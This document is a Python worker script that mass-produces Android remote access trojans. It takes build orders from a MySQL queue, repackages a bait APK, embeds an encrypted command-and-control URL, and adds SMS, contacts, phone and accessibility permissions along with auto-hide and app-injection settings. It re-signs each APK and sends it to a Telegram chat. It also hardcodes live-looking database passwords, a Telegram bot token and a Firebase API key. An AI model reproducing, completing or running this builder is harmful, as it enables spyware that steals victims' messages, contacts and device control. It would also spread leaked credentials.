import os, sys, json, time, re, shutil, struct, zipfile, zlib, hashlib, hmac, base64, subprocess, tempfile, requests
import pymysql
import random

DB_HOST = "mysql11.serv00.com"
DB_USER = "m6379_evil"
DB_PASS = "@Pol123Pol@"
DB_NAME = "m6379_evil"
BOT_TOKEN = "5586437586:AAGvhFk8ZjdX4pX390q9CBJwc-T1HiYJGno"
CHAT_ID = "-1002734766055"

BASE_DIR = "/app"
KD = os.path.join(BASE_DIR, "keys")
KSF = os.path.join(KD, "release.jks")
KIF = os.path.join(KD, "kilid.txt")

dastresi = {
    "phone": ["android.permission.READ_PHONE_STATE", "android.permission.READ_PHONE_NUMBERS", "android.permission.CALL_PHONE"],
    "sms": ["android.permission.SEND_SMS", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS"],
    "contacts": ["android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS", "android.permission.GET_ACCOUNTS"],
    "storage": ["android.permission.READ_EXTERNAL_STORAGE", "android.permission.READ_MEDIA_IMAGES"],
    "notification": ["android.permission.POST_NOTIFICATIONS"],
}
hameshe = ["android.permission.INTERNET", "android.permission.ACCESS_NETWORK_STATE", "android.permission.SYSTEM_ALERT_WINDOW", "android.permission.CAMERA", "android.permission.FOREGROUND_SERVICE", "android.permission.FOREGROUND_SERVICE_REMOTE_MESSAGING", "android.permission.WAKE_LOCK", "android.permission.RECEIVE_BOOT_COMPLETED", "com.google.android.c2dm.permission.RECEIVE", "android.permission.MODIFY_AUDIO_SETTINGS"]
mg = b"3141592653589793271828182845904516180339887498951414213562373095X9#mK$2vL@8qR!5wNZ1!yU*8xW@5sQ#7nM&2kH$9fE^3cA"
prims = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131]

def go(c):
    print("  " + " ".join(c), flush=True)
    return subprocess.run(c, capture_output=True, text=True)

def zip_drost(src, dst):
    z = zipfile.ZipFile(src)
    b = open(src, "rb").read()
    o = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED, allowZip64=True)
    for nm in z.namelist():
        nf = z.getinfo(nm)
        zi = zipfile.ZipInfo(nm, date_time=nf.date_time)
        zi.compress_type = nf.compress_type
        zi.external_attr = nf.external_attr
        if nf.flag_bits & 1:
            off = nf.header_offset
            sg, vr, fl, cm, mt, md, cr, cs, us, nl, el = struct.unpack_from("<IHHHHHIIIHH", b, off)
            st = off + 30 + nl + el
            cd = b[st:st + cs]
            dt = zlib.decompress(cd, -15) if cm == 8 else cd
            o.writestr(zi, dt)
        else:
            o.writestr(zi, z.read(nm))
    o.close(); z.close()

def zip_pak(src, dst):
    z = zipfile.ZipFile(src)
    b = open(src, "rb").read()
    o = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED, allowZip64=True)
    for nm in z.namelist():
        nf = z.getinfo(nm)
        zi = zipfile.ZipInfo(nm, date_time=(1980, 1, 1, 0, 0, 0))
        zi.compress_type = nf.compress_type
        zi.external_attr = 32
        zi.create_system = 0
        if nf.flag_bits & 1:
            off = nf.header_offset
            sg, vr, fl, cm, mt, md, cr, cs, us, nl, el = struct.unpack_from("<IHHHHHIIIHH", b, off)
            st = off + 30 + nl + el
            cd = b[st:st + cs]
            dt = zlib.decompress(cd, -15) if cm == 8 else cd
            o.writestr(zi, dt)
        else:
            o.writestr(zi, z.read(nm))
    o.close(); z.close()

def h32(i): return struct.pack(">I", i & 0xFFFFFFFF)
def b64e(b): return base64.b64encode(b).decode()
def hm256(k, d): return hmac.new(k, d, hashlib.sha256).digest()
def hm512(k, d): return hmac.new(k, d, hashlib.sha512).digest()

def kilad_biavar(lb, sm, ms):
    a = hm256(ms, sm)
    b = hm512(ms, a)[:32]
    x = lb.encode() + b"\x01" + b
    return hm256(a, x)[:32]

def ctr(d, k, iv):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    nc = iv[:12] + b"\x00" * 4
    c = Cipher(algorithms.AES(k), modes.CTR(nc)).encryptor()
    return c.update(d) + c.finalize()

def jadval(sm, ms):
    kk = sm + ms
    h = hm512(kk, b"sbox")
    fw = list(range(256))
    i = 255
    while i > 0:
        j = ((h[i % 64] ^ h[(i * 13) % 64]) + h[(i * 7) % 64] + i) % (i + 1)
        fw[i], fw[j] = fw[j], fw[i]
        i -= 1
    iv = [0] * 256
    for x in range(256): iv[fw[x]] = x
    return fw, iv

def jahel(n, sm, ms):
    a = hm256(sm + ms, b"layer-seed")
    pp = []; s = n - 1; i = 0
    while s > 0:
        i += 1; a2 = hm256(a, h32(i))
        j = (int.from_bytes(a2[:4], "big") & 0x7FFFFFFF) % (s + 1)
        pp.append((s, j)); s -= 1
    return pp

def jaran(d, sm, ms):
    a = hm256(sm + ms, b"layer-seed")
    o = bytearray(d); ps = 0; i = 0; n = len(d)
    while ps < n:
        i += 1; bf = h32(i); e3 = hm256(a, bf); e4 = hm256(a, bf + b"X")
        kb = bytes(a ^ b for a, b in zip(e3, e4))
        tk = min(len(kb), n - ps)
        for k in range(tk): o[ps + k] ^= kb[k]
        ps += tk
    return bytes(o)

def kilad():
    a = bytes([x % 256 for x in prims])
    t = a + mg; d1 = hashlib.sha512(t).digest(); d2 = hashlib.sha512(d1 + t[::-1]).digest()
    m = bytes(x ^ y for x, y in zip(d1, d2)); i = 1
    while i <= 5: m = hashlib.sha512(m + h32(i)).digest(); i += 1
    return m

def ramz_kon(s, ms):
    sm = os.urandom(32); ab1 = os.urandom(12); ab2 = os.urandom(12)
    d = zlib.compress(s.encode(), 9)[2:-4]; d = d[::-1]; d = jaran(d, sm, ms)
    fw, _ = jadval(sm, ms); ls = [fw[x] for x in d]
    pp = jahel(len(ls), sm, ms); ar = list(ls)
    for sz, j in pp: ar[sz], ar[j] = ar[j], ar[sz]
    b = bytes(ar); s3 = b.hex(); ck = hm256(ms + sm, s3.encode())[:16].hex()
    k1 = kilad_biavar("enc-key-1", sm, ms); k2 = kilad_biavar("enc-key-2", sm, ms)
    cj = json.dumps({"chk": ck}, separators=(",", ":"))
    l5 = (b64e(s3.encode()) + ":" + b64e(cj.encode())).encode()
    ct = ctr(l5, k1, ab1); ct = ctr(ct, k2, ab2)
    sc = hashlib.sha256(sm + ms).digest()[:8].hex()
    hj = json.dumps({"v": "v1", "sch": sc}, separators=(",", ":"))
    hd = b64e(hj.encode())
    return "v1." + b64e(sm) + "." + b64e(ab1) + "." + b64e(ab2) + "." + hd + "." + b64e(ct)

def asset_ha(prj, c, ms):
    ad = os.path.join(prj, "assets"); os.makedirs(ad, exist_ok=True)
    ra = c.get("rat_url") or c.get("c2_url")
    if ra:
        en = ramz_kon(ra, ms)
        json.dump({"receive": en}, open(os.path.join(ad, "receive.json"), "w"))
    if c.get("port"):
        json.dump({"port": c["port"]}, open(os.path.join(ad, "port.json"), "w"))
    px = c.get("permissions", {})
    if px:
        pm = {"phone": px.get("phone", "on"), "sms": px.get("sms", "on"), "contacts": px.get("contacts", "on"),
              "storage": px.get("storage", "on"), "Accessibility": px.get("accessibility", "off"),
              "notification": px.get("notification", "on"), "perm_force": px.get("force", "on")}
        json.dump(pm, open(os.path.join(ad, "permission.json"), "w"), indent=2)
    if c.get("off_mod") is not None: json.dump(c["off_mod"], open(os.path.join(ad, "offmod.json"), "w"), indent=2)
    if c.get("auto_hide") is not None: json.dump({"auto_hide": c["auto_hide"]}, open(os.path.join(ad, "auto_hide.json"), "w"))
    if c.get("placeholder_sizemb") is not None: json.dump({"sizemb": float(c["placeholder_sizemb"])}, open(os.path.join(ad, "placeholder.json"), "w"))
    if c.get("webview"): json.dump({"webview_url": c["webview"]}, open(os.path.join(ad, "webview.json"), "w"))
    if c.get("app_injection") is not None: json.dump({"app_injection": c["app_injection"]}, open(os.path.join(ad, "app_injection.json"), "w"))

def res_ha(prj, c):
    sp = os.path.join(prj, "res", "values", "strings.xml")
    if not os.path.exists(sp): return
    t = open(sp, encoding="utf-8").read()
    if c.get("app_name"):
        t = re.sub(r'(<string name="app_name">).*?(</string>)', r'\g<1>' + c["app_name"] + r'\g<2>', t)
    fb = c.get("firebase", {})
    for k, v in fb.items():
        pp = r'(<string name="' + re.escape(k) + r'">).*?(</string>)'
        if re.search(pp, t): t = re.sub(pp, r'\g<1>' + v + r'\g<2>', t)
    open(sp, "w", encoding="utf-8").write(t)

def manifi(prj, c):
    mp = os.path.join(prj, "AndroidManifest.xml")
    t = open(mp, encoding="utf-8").read()
    px = c.get("permissions", {})
    for cat, pl in dastresi.items():
        w = px.get(cat, "on") == "on"
        for pm in pl:
            if pm in hameshe: continue
            pp = re.compile(r'\s*<uses-permission[^>]*android:name="' + re.escape(pm) + r'"[^>]*/>')
            if w:
                if not pp.search(t):
                    tg = '<uses-permission android:name="' + pm + '"/>'
                    m = re.search(r'<application', t)
                    if m: t = t[:m.start()] + "    " + tg + "\n    " + t[m.start():]
                    else:
                        m2 = re.search(r'<manifest[^>]*>', t)
                        if m2: t = t[:m2.end()] + "\n    " + tg + t[m2.end():]
            else: t = pp.sub("", t)
    open(mp, "w", encoding="utf-8").write(t)

def ikon(prj, ic):
    for rt, _, fl in os.walk(os.path.join(prj, "res")):
        for fn in fl:
            if fn == "logo.png": shutil.copyfile(ic, os.path.join(rt, fn))

def bili(prj, out, ksp, alias):
    tmp = tempfile.mkdtemp(prefix="nb_")
    u1 = os.path.join(tmp, "u1.apk"); u2 = os.path.join(tmp, "u2.apk"); u3 = os.path.join(tmp, "u3.apk")
    if go(["apktool", "b", prj, "-o", u1, "-f"]).returncode != 0: return False
    zip_pak(u1, u2)
    if go(["zipalign", "-p", "-f", "4", u2, u3]).returncode != 0: return False
    r = go(["apksigner", "sign", "--ks", KSF, "--ks-pass", "pass:" + ksp, "--key-pass", "pass:" + ksp, "--ks-key-alias", alias, "--v2-signing-enabled", "true", "--v3-signing-enabled", "true", "--out", out, u3])
    shutil.rmtree(tmp, ignore_errors=True)
    return r.returncode == 0

def get_keystore():
    if not os.path.exists(KD): os.makedirs(KD)
    if os.path.exists(KSF) and os.path.exists(KIF):
        return open(KIF).read().strip(), "meta"
    pw = "".join(random.choices("abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789", k=24))
    go(["keytool", "-genkeypair", "-v", "-keystore", KSF, "-alias", "meta", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storetype", "PKCS12", "-storepass", pw, "-keypass", pw, "-dname", "CN=Android"])
    open(KIF, "w").write(pw)
    return pw, "meta"

def main():
    print("[*] Worker started. Connecting to DB...")
    try:
        db = pymysql.connect(host=DB_HOST, user=DB_USER, password=DB_PASS, database=DB_NAME, cursorclass=pymysql.cursors.DictCursor)
    except Exception as e:
        print(f"[-] DB Connection failed: {e}")
        return

    ksp, alias = get_keystore()
    base_apk = None
    for f in os.listdir(BASE_DIR):
        if f.endswith(".apk") and ("base" in f.lower() or "sexgame" in f.lower()):
            base_apk = os.path.join(BASE_DIR, f)
            break
    if not base_apk:
        for f in os.listdir(BASE_DIR):
            if f.endswith(".apk"):
                base_apk = os.path.join(BASE_DIR, f); break
    
    if not base_apk:
        print("[-] No base APK found in /app/!")
        return

    print(f"[*] Using base APK: {base_apk}")
    ms = kilad()

    while True:
        try:
            with db.cursor() as cursor:
                cursor.execute("SELECT * FROM get_build_apk WHERE status = 'pending' ORDER BY created_at ASC LIMIT 1")
                task = cursor.fetchone()
                
                if task:
                    print(f"[+] Found task for port: {task['port']}")
                    cursor.execute("UPDATE get_build_apk SET status = 'building' WHERE port = %s", (task['port'],))
                    db.commit()

                    cfg = {
                        "app_name": task['app_name'] or "App",
                        "rat_url": "https://diigijobi.site/receiver.php",
                        "port": task['port'],
                        "icon": None,
                        "permissions": {
                            "phone": task['perm_phone'], "sms": task['perm_sms'], "contacts": task['perm_contacts'],
                            "storage": task['perm_storage'], "accessibility": task['perm_accessibility'],
                            "notification": task['perm_notification'], "force": task['perm_force']
                        },
                        "off_mod": {"off_mod": task['off_mod'], "slot": 1},
                        "auto_hide": task['auto_hide'],
                        "placeholder_sizemb": float(task['sizemb'] or 15),
                        "webview": task['webview'],
                        "app_injection": task['app_injection'],
                        "firebase": {
                            "project_id": "testi-3dd57", "gcm_defaultSenderId": "349475795443",
                            "google_app_id": "1:349475795443:android:04414eb5aa57c79f93e286",
                            "google_api_key": "AIzaSyAN5NovxiIgGvvyyDzOGh6xjHBuyURprrM",
                            "google_storage_bucket": "testi-3dd57.firebasestorage.app"
                        }
                    }

                    wk = tempfile.mkdtemp(prefix="mk_")
                    try:
                        rp = os.path.join(wk, "rp.apk")
                        zip_drost(base_apk, rp)
                        pj = os.path.join(wk, "pj")
                        print("[*] Decoding APK...")
                        if go(["apktool", "d", "-s", "-f", "-o", pj, rp]).returncode != 0:
                            print("[-] Decode failed"); continue

                        asset_ha(pj, cfg, ms)
                        res_ha(pj, cfg)
                        manifi(pj, cfg)
                        
                        logo_path = task.get('logo')
                        if logo_path and os.path.exists(os.path.join(BASE_DIR, logo_path)):
                            ikon(pj, os.path.join(BASE_DIR, logo_path))

                        out_name = f"{cfg['app_name']}.apk"
                        out_path = os.path.join(BASE_DIR, out_name)
                        
                        print("[*] Building & Signing APK...")
                        if bili(pj, out_path, ksp, alias):
                            print("[+] Build Success! Sending to Telegram...")
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                            with open(out_path, 'rb') as f:
                                files = {'document': f}
                                data = {'chat_id': CHAT_ID, 'caption': f"✅ APK Generated\nPort: `{cfg['port']}`\nApp: {cfg['app_name']}"}
                                res = requests.post(url, data=data, files=files)
                            
                            if res.status_code == 200:
                                cursor.execute("UPDATE get_build_apk SET status = 'completed' WHERE port = %s", (task['port'],))
                                db.commit()
                                os.remove(out_path)
                            else:
                                print("[-] Telegram send failed.")
                        else:
                            print("[-] Build failed.")
                            cursor.execute("UPDATE get_build_apk SET status = 'failed' WHERE port = %s", (task['port'],))
                            db.commit()
                    finally:
                        shutil.rmtree(wk, ignore_errors=True)
        except Exception as e:
            print(f"[-] Error in loop: {e}")
            
        time.sleep(5)

if __name__ == "__main__":
    main()
